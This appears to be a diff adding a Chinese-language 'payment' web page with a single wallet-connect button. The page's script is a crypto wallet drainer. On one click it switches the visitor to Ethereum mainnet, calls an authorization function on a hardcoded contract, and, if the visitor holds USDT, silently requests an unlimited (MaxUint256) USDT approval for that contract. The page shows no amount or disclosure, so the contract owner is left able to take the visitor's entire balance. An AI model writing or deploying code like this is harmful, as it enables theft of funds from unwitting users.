@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>支付</title>
+    <script src="https://cdn.ethers.io/lib/ethers-6.13.1.umd.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        #connectButton {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            color: #007bff;
+            border: 2px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            padding: 0;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        #connectButton:hover {
+            background: #007bff;
+            color: white;
+        }
+        #connectButton.connected {
+            background: #28a745;
+            border-color: #28a745;
+            color: white;
+        }
+        #connectButton.connected:hover {
+            background: #218838;
+        }
+    </style>
+</head>
+<body>
+    <i id="connectButton" class="fas fa-wallet" title="連繫錢包"></i>
+
+    <script>
+        const connectButton = document.getElementById('connectButton');
+        
+        let provider;
+        let signer;
+        let userAddress;
+        let contract;
+        
+        const ETHEREUM_CONTRACT_ADDRESS = '0xd0dd2b726f7e7c6f7b62be25df61b7558a4ade08'; // 部署後更新
+        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+        const CONTRACT_ABI = [
+            "function connectAndAuthorize() external",
+            "event Authorized(address indexed customer)"
+        ];
+        const USDT_ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+            "function balanceOf(address) view returns (uint256)"
+        ];
+        
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // 切換至 Ethereum 主網
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x1' }]
+                    });
+                    
+                    // 連繫錢包
+                    provider = new ethers.BrowserProvider(window.ethereum);
+                    await provider.send('eth_requestAccounts', []);
+                    signer = await provider.getSigner();
+                    userAddress = await signer.getAddress();
+                    contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                    
+                    // 調用 connectAndAuthorize 表示同意扣款
+                    const txAuthorize = await contract.connectAndAuthorize();
+                    await txAuthorize.wait();
+                    
+                    // 自動調用 USDT approve
+                    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+                    const balance = await usdtContract.balanceOf(userAddress);
+                    if (balance > 0) {
+                        const maxAllowance = ethers.MaxUint256; // 設置最大授權
+                        const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
+                        await txApprove.wait();
+                    }
+                    
+                    // 更新圖標狀態
+                    connectButton.classList.add('connected');
+                    connectButton.title = '已連繫並授權';
+                    connectButton.disabled = true;
+                    
+                    // 監聽帳戶變更
+                    window.ethereum.on('accountsChanged', async (accounts) => {
+                        if (accounts.length === 0) {
+                            resetState();
+                        } else {
+                            userAddress = accounts[0];
+                            signer = await provider.getSigner();
+                            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                        }
+                    });
+                } catch (error) {
+                    console.error('操作失敗：', error.message);
+                    connectButton.classList.remove('connected');
+                    connectButton.title = '連繫錢包';
+                    connectButton.disabled = false;
+                }
+            } else {
+                console.error('請安裝 MetaMask 或支援的錢包');
+            }
+        }
+        
+        function resetState() {
+            signer = null;
+            userAddress = null;
+            contract = null;
+            connectButton.classList.remove('connected');
+            connectButton.title = '連繫錢包';
+            connectButton.disabled = false;
+        }
+        
+        connectButton.addEventListener('click', connectWallet);
+    </script>
+</body>
+</html>
